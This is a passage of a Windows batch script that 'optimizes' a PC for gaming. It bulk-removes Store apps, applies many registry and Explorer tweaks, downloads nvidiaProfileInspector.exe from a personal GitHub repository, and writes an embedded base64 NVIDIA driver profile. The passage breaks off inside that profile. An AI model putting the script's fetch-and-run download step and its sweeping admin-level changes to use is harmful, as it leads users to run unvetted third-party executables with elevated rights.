    echo     "*Microsoft.Todos*","*Microsoft.Windows.DevHome*","*Microsoft.WindowsAlarms*",
    echo     "*Microsoft.WindowsFeedbackHub*","*Microsoft.WindowsMaps*",
    echo     "*Microsoft.WindowsSoundRecorder*","*Microsoft.ZuneVideo*",
    echo     "*MicrosoftCorporationII.MicrosoftFamily*","*MicrosoftCorporationII.QuickAssist*",
    echo     "*MicrosoftTeams*","*MSTeams*","*AdobeSystemsIncorporated.AdobePhotoshopExpress*",
    echo     "*Amazon.com.Amazon*","*AmazonVideo.PrimeVideo*","*Disney*","*DrawboardPDF*",
    echo     "*Duolingo-LearnLanguagesforFree*","*Facebook*","*Flipboard*","*HULULLC.HULUPLUS*",
    echo     "*iHeartRadio*","*Instagram*","*king.com.BubbleWitch3Saga*",
    echo     "*king.com.CandyCrushSaga*","*king.com.CandyCrushSodaSaga*","*LinkedIn*",
    echo     "*Netflix*","*PandoraMediaInc*","*Plex*","*Spotify*","*TikTok*",
    echo     "*TuneInRadio*","*Twitter*","*Viber*","*WinZipUniversal*"
    echo ^)
    echo foreach ^($app in $apps^) {
    echo     Get-AppxPackage -Name $app -AllUsers -ErrorAction SilentlyContinue ^| Remove-AppxPackage -AllUsers -ErrorAction SilentlyContinue
    echo     Get-AppxProvisionedPackage -Online -ErrorAction SilentlyContinue ^| Where-Object {$_.PackageName -like $app} ^| Remove-AppxProvisionedPackage -Online -ErrorAction SilentlyContinue
    echo }
) > "!_BLOATPS!"
powershell -NoProfile -ExecutionPolicy Bypass -File "!_BLOATPS!" >nul 2>&1
if !ERRORLEVEL! neq 0 set STEP_ERR=1
if exist "!_BLOATPS!" del "!_BLOATPS!" >nul 2>&1
if !STEP_ERR!==0 (
    echo  [OK] Bloatware Removed
    set /a PASS+=1
) else (
    echo  [FAIL] Bloatware Removal
    set /a FAIL+=1
    echo Bloatware Removal>> "!_FAILS!"
)

:: ================================================
:: STEP 30 - Additional UI and System Tweaks
:: ================================================
echo [STEP 30/32] Applying Additional UI and System Tweaks...
set STEP_ERR=0
:: Intel LMS - remote management service (security risk, zero gaming benefit)
sc config LMS start= disabled >nul 2>&1 & sc stop LMS >nul 2>&1
:: WPBT - blocks OEM vendor startup scripts embedded in BIOS/UEFI firmware
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager" /v "DisableWpbtExecution" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
:: WifiSense - disables automatic WiFi sharing with contacts
REG ADD "HKLM\SOFTWARE\Microsoft\PolicyManager\default\WiFi\AllowWiFiHotSpotReporting" /v "Value" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SOFTWARE\Microsoft\PolicyManager\default\WiFi\AllowAutoConnectToWiFiSenseHotspots" /v "Value" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SOFTWARE\Microsoft\WcmSvc\wifinetworkmanager\config" /v "AutoConnectAllowedOEM" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
:: Disable Paint AI (Cocreator)
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows\Paint" /v "DisablePaintAI" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
:: Disable Notepad AI (rewrite and summarise features)
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows\Notepad" /v "DisableNotepadAI" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
:: Remove Home from File Explorer sidebar
REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" /v "HubMode" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG DELETE "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Desktop\NameSpace\{f874310e-b6b7-47dc-bc84-b9e6b38f5903}" /f >nul 2>&1
:: Remove Gallery from File Explorer sidebar
REG DELETE "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Desktop\NameSpace\{e88865ea-0e1c-4e20-9aa6-edcd0212c87c}" /f >nul 2>&1
:: Show file extensions in Explorer (hidden by default, critical for security awareness)
REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "HideFileExt" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
:: Restore Windows 10 right-click context menu on Windows 11
REG ADD "HKCU\Software\Classes\CLSID\{86ca1aa0-34aa-4e8b-a509-50c905bae2a2}\InprocServer32" /ve /t REG_SZ /d "" /f >nul 2>&1 || set STEP_ERR=1
:: Left-align taskbar icons (Windows 11 defaults to centre)
REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "TaskbarAl" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
:: Hide Search icon from taskbar
REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Search" /v "SearchboxTaskbarMode" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
:: Taskbar window previews appear instantly with no hover delay
REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "ExtendedUIHoverTime" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
:: Disable Microsoft 365 ads and sync provider notifications in Explorer
REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "ShowSyncProviderNotifications" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
:: Hide Settings Home page (Windows 11)
REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "SettingsPageVisibility" /t REG_SZ /d "hide:home" /f >nul 2>&1 || set STEP_ERR=1
:: Remove all pinned apps from Start Menu
del /f /q "%LOCALAPPDATA%\Microsoft\Windows\Shell\LayoutModification.xml" >nul 2>&1
:: Restart Explorer to apply all UI changes
taskkill /f /im explorer.exe >nul 2>&1
start explorer.exe
if !STEP_ERR!==0 (
    echo  [OK] Additional UI and System Tweaks
    set /a PASS+=1
) else (
    echo  [FAIL] Additional UI and System Tweaks
    set /a FAIL+=1
    echo Additional UI and System Tweaks>> "!_FAILS!"
)

:: ================================================
:: STEP 31 - NVIDIA 3D Profile Setup
:: ================================================
echo [STEP 31/32] Applying NVIDIA 3D Profile...
set STEP_ERR=0

:: Detect NVIDIA GPU - checks ALL video adapters so works on laptops with iGPU + discrete GPU
set "_NVGPU="
for /f "tokens=*" %%G in ('wmic path win32_VideoController get name 2^>nul ^| findstr /i "NVIDIA"') do if not defined _NVGPU set "_NVGPU=%%G"
if not defined _NVGPU (
    echo  [SKIP] No NVIDIA GPU detected
    goto :NVIDIA_DONE
)
echo  Detected: !_NVGPU!

set "_NVPI=%SystemRoot%\Temp\nvidiaProfileInspector.exe"
set "_NVNIP_B64=%SystemRoot%\Temp\inspector_b64.txt"
set "_NVNIP=%SystemRoot%\Temp\inspector.nip"

:: Download NVIDIA Profile Inspector from GitHub
echo  Downloading NVIDIA Profile Inspector...
powershell -NoProfile -Command "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/Yel1oww/WinLightOptimizer/main/nvidiaProfileInspector.exe','!_NVPI!')" >nul 2>&1
if !ERRORLEVEL! neq 0 (
    echo  [FAIL] Could not download Profile Inspector - check internet connection
    set STEP_ERR=1
    goto :NVIDIA_CLEANUP
)

:: Write embedded NIP profile base64 to temp file
if exist "!_NVNIP_B64!" del "!_NVNIP_B64!" >nul 2>&1
echo 77u/PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0idXRmLTE2Ij8+DQo8QXJy>> "!_NVNIP_B64!"
echo YXlPZlByb2ZpbGU+DQogIDxQcm9maWxlPg0KICAgIDxQcm9maWxlTmFtZT5CYXNl>> "!_NVNIP_B64!"
echo IFByb2ZpbGU8L1Byb2ZpbGVOYW1lPg0KICAgIDxFeGVjdXRlYWJsZXMgLz4NCiAg>> "!_NVNIP_B64!"
echo ICA8U2V0dGluZ3M+DQogICAgICA8UHJvZmlsZVNldHRpbmc+DQogICAgICAgIDxT>> "!_NVNIP_B64!"
echo ZXR0aW5nTmFtZUluZm8+IDwvU2V0dGluZ05hbWVJbmZvPg0KICAgICAgICA8U2V0>> "!_NVNIP_B64!"
echo dGluZ0lEPjM5MDQ2NzwvU2V0dGluZ0lEPg0KICAgICAgICA8U2V0dGluZ1ZhbHVl>> "!_NVNIP_B64!"
echo PjE8L1NldHRpbmdWYWx1ZT4NCiAgICAgICAgPFZhbHVlVHlwZT5Ed29yZDwvVmFs>> "!_NVNIP_B64!"
echo dWVUeXBlPg0KICAgICAgPC9Qcm9maWxlU2V0dGluZz4NCiAgICAgIDxQcm9maWxl>> "!_NVNIP_B64!"
echo U2V0dGluZz4NCiAgICAgICAgPFNldHRpbmdOYW1lSW5mbyAvPg0KICAgICAgICA8>> "!_NVNIP_B64!"
echo U2V0dGluZ0lEPjk4MzIyNjwvU2V0dGluZ0lEPg0KICAgICAgICA8U2V0dGluZ1Zh>> "!_NVNIP_B64!"
echo bHVlPjE8L1NldHRpbmdWYWx1ZT4NCiAgICAgICAgPFZhbHVlVHlwZT5Ed29yZDwv>> "!_NVNIP_B64!"
echo VmFsdWVUeXBlPg0KICAgICAgPC9Qcm9maWxlU2V0dGluZz4NCiAgICAgIDxQcm9m>> "!_NVNIP_B64!"
echo aWxlU2V0dGluZz4NCiAgICAgICAgPFNldHRpbmdOYW1lSW5mbyAvPg0KICAgICAg>> "!_NVNIP_B64!"
echo ICA8U2V0dGluZ0lEPjk4MzIyNzwvU2V0dGluZ0lEPg0KICAgICAgICA8U2V0dGlu>> "!_NVNIP_B64!"
echo Z1ZhbHVlPjE8L1NldHRpbmdWYWx1ZT4NCiAgICAgICAgPFZhbHVlVHlwZT5Ed29y>> "!_NVNIP_B64!"
echo ZDwvVmFsdWVUeXBlPg0KICAgICAgPC9Qcm9maWxlU2V0dGluZz4NCiAgICAgIDxQ>> "!_NVNIP_B64!"
echo cm9maWxlU2V0dGluZz4NCiAgICAgICAgPFNldHRpbmdOYW1lSW5mbyAvPg0KICAg>> "!_NVNIP_B64!"
echo ICAgICA8U2V0dGluZ0lEPjk4MzI5NTwvU2V0dGluZ0lEPg0KICAgICAgICA8U2V0>> "!_NVNIP_B64!"
echo dGluZ1ZhbHVlPkFBQUFRQUFBQUFBPTwvU2V0dGluZ1ZhbHVlPg0KICAgICAgICA8>> "!_NVNIP_B64!"
echo VmFsdWVUeXBlPkJpbmFyeTwvVmFsdWVUeXBlPg0KICAgICAgPC9Qcm9maWxlU2V0>> "!_NVNIP_B64!"
echo dGluZz4NCiAgICAgIDxQcm9maWxlU2V0dGluZz4NCiAgICAgICAgPFNldHRpbmdO>> "!_NVNIP_B64!"
echo YW1lSW5mbz5TaGFkZXIgQ2FjaGU8L1NldHRpbmdOYW1lSW5mbz4NCiAgICAgICAg>> "!_NVNIP_B64!"
echo PFNldHRpbmdJRD4xNjc1MjYzPC9TZXR0aW5nSUQ+DQogICAgICAgIDxTZXR0aW5n>> "!_NVNIP_B64!"
echo VmFsdWU+MTwvU2V0dGluZ1ZhbHVlPg0KICAgICAgICA8VmFsdWVUeXBlPkR3b3Jk>> "!_NVNIP_B64!"
echo PC9WYWx1ZVR5cGU+DQogICAgICA8L1Byb2ZpbGVTZXR0aW5nPg0KICAgICAgPFBy>> "!_NVNIP_B64!"
echo b2ZpbGVTZXR0aW5nPg0KICAgICAgICA8U2V0dGluZ05hbWVJbmZvPlRleHR1cmUg>> "!_NVNIP_B64!"
echo ZmlsdGVyaW5nIC0gTmVnYXRpdmUgTE9EIGJpYXM8L1NldHRpbmdOYW1lSW5mbz4N>> "!_NVNIP_B64!"
echo CiAgICAgICAgPFNldHRpbmdJRD4xNjg2Mzc2PC9TZXR0aW5nSUQ+DQogICAgICAg>> "!_NVNIP_B64!"
echo IDxTZXR0aW5nVmFsdWU+MDwvU2V0dGluZ1ZhbHVlPg0KICAgICAgICA8VmFsdWVU>> "!_NVNIP_B64!"
echo eXBlPkR3b3JkPC9WYWx1ZVR5cGU+DQogICAgICA8L1Byb2ZpbGVTZXR0aW5nPg0K>> "!_NVNIP_B64!"
echo ICAgICAgPFByb2ZpbGVTZXR0aW5nPg0KICAgICAgICA8U2V0dGluZ05hbWVJbmZv>> "!_NVNIP_B64!"
echo PlRleHR1cmUgZmlsdGVyaW5nIC0gVHJpbGluZWFyIG9wdGltaXphdGlvbjwvU2V0>> "!_NVNIP_B64!"
echo dGluZ05hbWVJbmZvPg0KICAgICAgICA8U2V0dGluZ0lEPjMwNjY2MTA8L1NldHRp>> "!_NVNIP_B64!"
echo bmdJRD4NCiAgICAgICAgPFNldHRpbmdWYWx1ZT4wPC9TZXR0aW5nVmFsdWU+DQog>> "!_NVNIP_B64!"
echo ICAgICAgIDxWYWx1ZVR5cGU+RHdvcmQ8L1ZhbHVlVHlwZT4NCiAgICAgIDwvUHJv>> "!_NVNIP_B64!"
echo ZmlsZVNldHRpbmc+DQogICAgICA8UHJvZmlsZVNldHRpbmc+DQogICAgICAgIDxT>> "!_NVNIP_B64!"
echo ZXR0aW5nTmFtZUluZm8+U2hhcnBlbmluZyBWYWx1ZTwvU2V0dGluZ05hbWVJbmZv>> "!_NVNIP_B64!"
echo Pg0KICAgICAgICA8U2V0dGluZ0lEPjMwNzAxNTc8L1NldHRpbmdJRD4NCiAgICAg>> "!_NVNIP_B64!"
echo ICAgPFNldHRpbmdWYWx1ZT41MDwvU2V0dGluZ1ZhbHVlPg0KICAgICAgICA8VmFs>> "!_NVNIP_B64!"
echo dWVUeXBlPkR3b3JkPC9WYWx1ZVR5cGU+DQogICAgICA8L1Byb2ZpbGVTZXR0aW5n>> "!_NVNIP_B64!"
echo Pg0KICAgICAgPFByb2ZpbGVTZXR0aW5nPg0KICAgICAgICA8U2V0dGluZ05hbWVJ>> "!_NVNIP_B64!"
echo bmZvPlNoYXJwZW5pbmcgLSBEZW5vaXNpbmcgRmFjdG9yPC9TZXR0aW5nTmFtZUlu>> "!_NVNIP_B64!"
echo Zm8+DQogICAgICAgIDxTZXR0aW5nSUQ+MzA3MDE1ODwvU2V0dGluZ0lEPg0KICAg>> "!_NVNIP_B64!"
echo ICAgICA8U2V0dGluZ1ZhbHVlPjE3PC9TZXR0aW5nVmFsdWU+DQogICAgICAgIDxW>> "!_NVNIP_B64!"
echo YWx1ZVR5cGU+RHdvcmQ8L1ZhbHVlVHlwZT4NCiAgICAgIDwvUHJvZmlsZVNldHRp>> "!_NVNIP_B64!"
echo bmc+DQogICAgICA8UHJvZmlsZVNldHRpbmc+DQogICAgICAgIDxTZXR0aW5nTmFt>> "!_NVNIP_B64!"
echo ZUluZm8+U2hhcnBlbmluZyBGaWx0ZXI8L1NldHRpbmdOYW1lSW5mbz4NCiAgICAg>> "!_NVNIP_B64!"
echo ICAgPFNldHRpbmdJRD41ODY3ODE2PC9TZXR0aW5nSUQ+DQogICAgICAgIDxTZXR0>> "!_NVNIP_B64!"
echo aW5nVmFsdWU+MDwvU2V0dGluZ1ZhbHVlPg0KICAgICAgICA8VmFsdWVUeXBlPkR3>> "!_NVNIP_B64!"
echo b3JkPC9WYWx1ZVR5cGU+DQogICAgICA8L1Byb2ZpbGVTZXR0aW5nPg0KICAgICAg>> "!_NVNIP_B64!"
echo PFByb2ZpbGVTZXR0aW5nPg0KICAgICAgICA8U2V0dGluZ05hbWVJbmZvPlZlcnRp>> "!_NVNIP_B64!"
echo Y2FsIFN5bmMgVGVhciBDb250cm9sPC9TZXR0aW5nTmFtZUluZm8+DQogICAgICAg>> "!_NVNIP_B64!"
echo IDxTZXR0aW5nSUQ+NTkxMjQxMjwvU2V0dGluZ0lEPg0KICAgICAgICA8U2V0dGlu>> "!_NVNIP_B64!"
echo Z1ZhbHVlPjI1MjUzNjg0Mzk8L1NldHRpbmdWYWx1ZT4NCiAgICAgICAgPFZhbHVl>> "!_NVNIP_B64!"
echo VHlwZT5Ed29yZDwvVmFsdWVUeXBlPg0KICAgICAgPC9Qcm9maWxlU2V0dGluZz4N>> "!_NVNIP_B64!"
echo CiAgICAgIDxQcm9maWxlU2V0dGluZz4NCiAgICAgICAgPFNldHRpbmdOYW1lSW5m>> "!_NVNIP_B64!"
echo bz5QcmVmZXJyZWQgcmVmcmVzaCByYXRlPC9TZXR0aW5nTmFtZUluZm8+DQogICAg>> "!_NVNIP_B64!"
echo ICAgIDxTZXR0aW5nSUQ+NjYwMDAwMTwvU2V0dGluZ0lEPg0KICAgICAgICA8U2V0>> "!_NVNIP_B64!"
echo dGluZ1ZhbHVlPjE8L1NldHRpbmdWYWx1ZT4NCiAgICAgICAgPFZhbHVlVHlwZT5E>> "!_NVNIP_B64!"
echo d29yZDwvVmFsdWVUeXBlPg0KICAgICAgPC9Qcm9maWxlU2V0dGluZz4NCiAgICAg>> "!_NVNIP_B64!"
echo IDxQcm9maWxlU2V0dGluZz4NCiAgICAgICAgPFNldHRpbmdOYW1lSW5mbz5OVklE>> "!_NVNIP_B64!"
echo SUEgUHJlZGVmaW5lZCBBbWJpZW50IE9jY2x1c2lvbiBVc2FnZTwvU2V0dGluZ05h>> "!_NVNIP_B64!"
echo bWVJbmZvPg0KICAgICAgICA8U2V0dGluZ0lEPjY3MDE4ODE8L1NldHRpbmdJRD4N>> "!_NVNIP_B64!"
echo CiAgICAgICAgPFNldHRpbmdWYWx1ZT4wPC9TZXR0aW5nVmFsdWU+DQogICAgICAg>> "!_NVNIP_B64!"
echo IDxWYWx1ZVR5cGU+RHdvcmQ8L1ZhbHVlVHlwZT4NCiAgICAgIDwvUHJvZmlsZVNl>> "!_NVNIP_B64!"
echo dHRpbmc+DQogICAgICA8UHJvZmlsZVNldHRpbmc+DQogICAgICAgIDxTZXR0aW5n>> "!_NVNIP_B64!"
echo TmFtZUluZm8+IDwvU2V0dGluZ05hbWVJbmZvPg0KICAgICAgICA8U2V0dGluZ0lE>> "!_NVNIP_B64!"
echo PjY3MTA4MzY8L1NldHRpbmdJRD4NCiAgICAgICAgPFNldHRpbmdWYWx1ZT4wPC9T>> "!_NVNIP_B64!"
echo ZXR0aW5nVmFsdWU+DQogICAgICAgIDxWYWx1ZVR5cGU+RHdvcmQ8L1ZhbHVlVHlw>> "!_NVNIP_B64!"
echo ZT4NCiAgICAgIDwvUHJvZmlsZVNldHRpbmc+DQogICAgICA8UHJvZmlsZVNldHRp>> "!_NVNIP_B64!"
echo bmc+DQogICAgICAgIDxTZXR0aW5nTmFtZUluZm8+IDwvU2V0dGluZ05hbWVJbmZv>> "!_NVNIP_B64!"
echo Pg0KICAgICAgICA8U2V0dGluZ0lEPjY3MTA4ODU8L1NldHRpbmdJRD4NCiAgICAg>> "!_NVNIP_B64!"
echo ICAgPFNldHRpbmdWYWx1ZT4xPC9TZXR0aW5nVmFsdWU+DQogICAgICAgIDxWYWx1>> "!_NVNIP_B64!"
echo ZVR5cGU+RHdvcmQ8L1ZhbHVlVHlwZT4NCiAgICAgIDwvUHJvZmlsZVNldHRpbmc+>> "!_NVNIP_B64!"
echo DQogICAgICA8UHJvZmlsZVNldHRpbmc+DQogICAgICAgIDxTZXR0aW5nTmFtZUlu>> "!_NVNIP_B64!"
echo Zm8+QW1iaWVudCBPY2NsdXNpb248L1NldHRpbmdOYW1lSW5mbz4NCiAgICAgICAg>> "!_NVNIP_B64!"
echo PFNldHRpbmdJRD42NzE0MTUzPC9TZXR0aW5nSUQ+DQogICAgICAgIDxTZXR0aW5n>> "!_NVNIP_B64!"
echo VmFsdWU+MDwvU2V0dGluZ1ZhbHVlPg0KICAgICAgICA8VmFsdWVUeXBlPkR3b3Jk>> "!_NVNIP_B64!"
echo PC9WYWx1ZVR5cGU+DQogICAgICA8L1Byb2ZpbGVTZXR0aW5nPg0KICAgICAgPFBy>> "!_NVNIP_B64!"
echo b2ZpbGVTZXR0aW5nPg0KICAgICAgICA8U2V0dGluZ05hbWVJbmZvPiA8L1NldHRp>> "!_NVNIP_B64!"
echo bmdOYW1lSW5mbz4NCiAgICAgICAgPFNldHRpbmdJRD42Nzc2MzczPC9TZXR0aW5n>> "!_NVNIP_B64!"
echo SUQ+DQogICAgICAgIDxTZXR0aW5nVmFsdWU+MTwvU2V0dGluZ1ZhbHVlPg0KICAg>> "!_NVNIP_B64!"
echo ICAgICA8VmFsdWVUeXBlPkR3b3JkPC9WYWx1ZVR5cGU+DQogICAgICA8L1Byb2Zp>> "!_NVNIP_B64!"
echo bGVTZXR0aW5nPg0KICAgICAgPFByb2ZpbGVTZXR0aW5nPg0KICAgICAgICA8U2V0>> "!_NVNIP_B64!"
echo dGluZ05hbWVJbmZvPiA8L1NldHRpbmdOYW1lSW5mbz4NCiAgICAgICAgPFNldHRp>> "!_NVNIP_B64!"
echo bmdJRD42Nzc2OTM3PC9TZXR0aW5nSUQ+DQogICAgICAgIDxTZXR0aW5nVmFsdWU+>> "!_NVNIP_B64!"
echo MDwvU2V0dGluZ1ZhbHVlPg0KICAgICAgICA8VmFsdWVUeXBlPkR3b3JkPC9WYWx1>> "!_NVNIP_B64!"
echo ZVR5cGU+DQogICAgICA8L1Byb2ZpbGVTZXR0aW5nPg0KICAgICAgPFByb2ZpbGVT>> "!_NVNIP_B64!"
echo ZXR0aW5nPg0KICAgICAgICA8U2V0dGluZ05hbWVJbmZvPk1heGltdW0gcHJlLXJl>> "!_NVNIP_B64!"
echo bmRlcmVkIGZyYW1lczwvU2V0dGluZ05hbWVJbmZvPg0KICAgICAgICA8U2V0dGlu>> "!_NVNIP_B64!"
echo Z0lEPjgxMDIwNDY8L1NldHRpbmdJRD4NCiAgICAgICAgPFNldHRpbmdWYWx1ZT4x>> "!_NVNIP_B64!"
echo PC9TZXR0aW5nVmFsdWU+DQogICAgICAgIDxWYWx1ZVR5cGU+RHdvcmQ8L1ZhbHVl>> "!_NVNIP_B64!"
echo VHlwZT4NCiAgICAgIDwvUHJvZmlsZVNldHRpbmc+DQogICAgICA8UHJvZmlsZVNl>> "!_NVNIP_B64!"
echo dHRpbmc+DQogICAgICAgIDxTZXR0aW5nTmFtZUluZm8+VGV4dHVyZSBmaWx0ZXJp>> "!_NVNIP_B64!"
echo bmcgLSBBbmlzb3Ryb3BpYyBmaWx0ZXIgb3B0aW1pemF0aW9uPC9TZXR0aW5nTmFt>> "!_NVNIP_B64!"
echo ZUluZm8+DQogICAgICAgIDxTZXR0aW5nSUQ+ODcwMzM0NDwvU2V0dGluZ0lEPg0K>> "!_NVNIP_B64!"
echo ICAgICAgICA8U2V0dGluZ1ZhbHVlPjE8L1NldHRpbmdWYWx1ZT4NCiAgICAgICAg>> "!_NVNIP_B64!"
echo PFZhbHVlVHlwZT5Ed29yZDwvVmFsdWVUeXBlPg0KICAgICAgPC9Qcm9maWxlU2V0>> "!_NVNIP_B64!"
echo dGluZz4NCiAgICAgIDxQcm9maWxlU2V0dGluZz4NCiAgICAgICAgPFNldHRpbmdO>> "!_NVNIP_B64!"
echo YW1lSW5mbz5TSUxLIFNtb290aG5lc3M8L1NldHRpbmdOYW1lSW5mbz4NCiAgICAg>> "!_NVNIP_B64!"
echo ICAgPFNldHRpbmdJRD45OTkwNzM3PC9TZXR0aW5nSUQ+DQogICAgICAgIDxTZXR0>> "!_NVNIP_B64!"
echo aW5nVmFsdWU+MDwvU2V0dGluZ1ZhbHVlPg0KICAgICAgICA8VmFsdWVUeXBlPkR3>> "!_NVNIP_B64!"
echo b3JkPC9WYWx1ZVR5cGU+DQogICAgICA8L1Byb2ZpbGVTZXR0aW5nPg0KICAgICAg>> "!_NVNIP_B64!"
echo PFByb2ZpbGVTZXR0aW5nPg0KICAgICAgICA8U2V0dGluZ05hbWVJbmZvPkVuYWJs>> "!_NVNIP_B64!"
echo ZSBzYW1wbGUgaW50ZXJsZWF2aW5nIChNRkFBKTwvU2V0dGluZ05hbWVJbmZvPg0K>> "!_NVNIP_B64!"
echo ICAgICAgICA8U2V0dGluZ0lEPjEwMDExMDUyPC9TZXR0aW5nSUQ+DQogICAgICAg>> "!_NVNIP_B64!"
echo IDxTZXR0aW5nVmFsdWU+MDwvU2V0dGluZ1ZhbHVlPg0KICAgICAgICA8VmFsdWVU>> "!_NVNIP_B64!"
echo eXBlPkR3b3JkPC9WYWx1ZVR5cGU+DQogICAgICA8L1Byb2ZpbGVTZXR0aW5nPg0K>> "!_NVNIP_B64!"
echo ICAgICAgPFByb2ZpbGVTZXR0aW5nPg0KICAgICAgICA8U2V0dGluZ05hbWVJbmZv>> "!_NVNIP_B64!"
echo PlZlcnRpY2FsIFN5bmM8L1NldHRpbmdOYW1lSW5mbz4NCiAgICAgICAgPFNldHRp>> "!_NVNIP_B64!"
echo bmdJRD4xMTA0MTIzMTwvU2V0dGluZ0lEPg0KICAgICAgICA8U2V0dGluZ1ZhbHVl>> "!_NVNIP_B64!"
echo PjEzODUwNDAwNzwvU2V0dGluZ1ZhbHVlPg0KICAgICAgICA8VmFsdWVUeXBlPkR3>> "!_NVNIP_B64!"
echo b3JkPC9WYWx1ZVR5cGU+DQogICAgICA8L1Byb2ZpbGVTZXR0aW5nPg0KICAgICAg>> "!_NVNIP_B64!"
echo PFByb2ZpbGVTZXR0aW5nPg0KICAgICAgICA8U2V0dGluZ05hbWVJbmZvPlNoYXJw>> "!_NVNIP_B64!"
echo ZW5pbmcgVmFsdWUgZm9yIE5JUyAyLjA8L1NldHRpbmdOYW1lSW5mbz4NCiAgICAg>> "!_NVNIP_B64!"
echo ICAgPFNldHRpbmdJRD4xMTI1MDQ2NTwvU2V0dGluZ0lEPg0KICAgICAgICA8U2V0>> "!_NVNIP_B64!"
echo dGluZ1ZhbHVlPjUwPC9TZXR0aW5nVmFsdWU+DQogICAgICAgIDxWYWx1ZVR5cGU+>> "!_NVNIP_B64!"
echo RHdvcmQ8L1ZhbHVlVHlwZT4NCiAgICAgIDwvUHJvZmlsZVNldHRpbmc+DQogICAg>> "!_NVNIP_B64!"
echo ICA8UHJvZmlsZVNldHRpbmc+DQogICAgICAgIDxTZXR0aW5nTmFtZUluZm8+RW5h>> "!_NVNIP_B64!"
echo YmxlIE5JUyAyLjA8L1NldHRpbmdOYW1lSW5mbz4NCiAgICAgICAgPFNldHRpbmdJ>> "!_NVNIP_B64!"
echo RD4xMTI1MDcyMTwvU2V0dGluZ0lEPg0KICAgICAgICA8U2V0dGluZ1ZhbHVlPjA8>> "!_NVNIP_B64!"
echo L1NldHRpbmdWYWx1ZT4NCiAgICAgICAgPFZhbHVlVHlwZT5Ed29yZDwvVmFsdWVU>> "!_NVNIP_B64!"
echo eXBlPg0KICAgICAgPC9Qcm9maWxlU2V0dGluZz4NCiAgICAgIDxQcm9maWxlU2V0>> "!_NVNIP_B64!"
echo dGluZz4NCiAgICAgICAgPFNldHRpbmdOYW1lSW5mbz5FbmFibGUgTklTMiBBcHAg>> "!_NVNIP_B64!"
echo Q291bnQ8L1NldHRpbmdOYW1lSW5mbz4NCiAgICAgICAgPFNldHRpbmdJRD4xMTI1>> "!_NVNIP_B64!"
echo MDczNzwvU2V0dGluZ0lEPg0KICAgICAgICA8U2V0dGluZ1ZhbHVlPjA8L1NldHRp>> "!_NVNIP_B64!"
echo bmdWYWx1ZT4NCiAgICAgICAgPFZhbHVlVHlwZT5Ed29yZDwvVmFsdWVUeXBlPg0K>> "!_NVNIP_B64!"
echo ICAgICAgPC9Qcm9maWxlU2V0dGluZz4NCiAgICAgIDxQcm9maWxlU2V0dGluZz4N>> "!_NVNIP_B64!"
echo CiAgICAgICAgPFNldHRpbmdOYW1lSW5mbz5TaGFkZXIgZGlzayBjYWNoZSBtYXhp>> "!_NVNIP_B64!"
echo bXVtIHNpemU8L1NldHRpbmdOYW1lSW5mbz4NCiAgICAgICAgPFNldHRpbmdJRD4x>> "!_NVNIP_B64!"
echo MTMwNjEzNTwvU2V0dGluZ0lEPg0KICAgICAgICA8U2V0dGluZ1ZhbHVlPjQyOTQ5>> "!_NVNIP_B64!"
echo NjcyOTU8L1NldHRpbmdWYWx1ZT4NCiAgICAgICAgPFZhbHVlVHlwZT5Ed29yZDwv>> "!_NVNIP_B64!"
echo VmFsdWVUeXBlPg0KICAgICAgPC9Qcm9maWxlU2V0dGluZz4NCiAgICAgIDxQcm9m>> "!_NVNIP_B64!"
echo aWxlU2V0dGluZz4NCiAgICAgICAgPFNldHRpbmdOYW1lSW5mbyAvPg0KICAgICAg>> "!_NVNIP_B64!"
echo ICA8U2V0dGluZ0lEPjEyOTkxMDk3PC9TZXR0aW5nSUQ+DQogICAgICAgIDxTZXR0>> "!_NVNIP_B64!"
echo aW5nVmFsdWU+MTwvU2V0dGluZ1ZhbHVlPg0KICAgICAgICA8VmFsdWVUeXBlPkR3>> "!_NVNIP_B64!"
echo b3JkPC9WYWx1ZVR5cGU+DQogICAgICA8L1Byb2ZpbGVTZXR0aW5nPg0KICAgICAg>> "!_NVNIP_B64!"
echo PFByb2ZpbGVTZXR0aW5nPg0KICAgICAgICA8U2V0dGluZ05hbWVJbmZvPlRleHR1>> "!_NVNIP_B64!"
echo cmUgZmlsdGVyaW5nIC0gUXVhbGl0eTwvU2V0dGluZ05hbWVJbmZvPg0KICAgICAg>> "!_NVNIP_B64!"
echo ICA8U2V0dGluZ0lEPjEzNTEwMjg5PC9TZXR0aW5nSUQ+DQogICAgICAgIDxTZXR0>> "!_NVNIP_B64!"
echo aW5nVmFsdWU+MjA8L1NldHRpbmdWYWx1ZT4NCiAgICAgICAgPFZhbHVlVHlwZT5E>> "!_NVNIP_B64!"
echo d29yZDwvVmFsdWVUeXBlPg0KICAgICAgPC9Qcm9maWxlU2V0dGluZz4NCiAgICAg>> "!_NVNIP_B64!"
